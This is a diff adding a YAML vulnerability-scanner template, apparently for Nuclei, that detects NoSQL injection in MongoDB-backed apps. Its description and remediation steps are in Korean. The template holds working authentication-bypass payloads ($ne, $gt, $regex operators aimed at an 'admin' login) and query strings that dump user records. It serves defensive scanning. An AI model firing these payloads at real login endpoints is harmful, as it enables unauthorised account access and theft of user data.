@@ -1,0 +1,73 @@
+id: sqli-nosql-mongodb
+
+info:
+  name: NoSQL Injection via MongoDB Operators
+  author: security-researcher
+  severity: high
+  description: |
+    MongoDB 등 NoSQL 데이터베이스에서 발생하는 인젝션 취약점을 탐지합니다.
+    $where, $regex, $gt 등의 연산자를 이용한 인증 우회 및 데이터 추출이 가능합니다.
+  tags: nosql,mongodb,injection,auth-bypass
+  remediation: |
+    - MongoDB 연산자 입력 필터링
+    - Mongoose 등 ODM에서 sanitize-html 또는 mongo-sanitize 사용
+    - $where 연산자 비활성화
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/auth"
+
+    headers:
+      Content-Type: application/json
+
+    payloads:
+      nosql_payload:
+        - '{"$gt": ""}'
+        - '{"$ne": null}'
+        - '{"$ne": ""}'
+        - '{"$exists": true}'
+        - '{"$regex": ".*"}'
+
+    body: |
+      {"username": "admin", "password": {{nosql_payload}}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "welcome"
+          - "logout"
+          - "token"
+          - "session"
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 200
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?username[$gt]="
+      - "{{BaseURL}}/api/users?username[$ne]=invalid"
+      - "{{BaseURL}}/api/users?username[$regex]=.*"
+      - "{{BaseURL}}/api/users?id[$gt]=0"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[\\{.*\\}\\]"
+          - '"_id":'
+          - '"username":'
+        condition: or
+
+      - type: status
+        status:
+          - 200
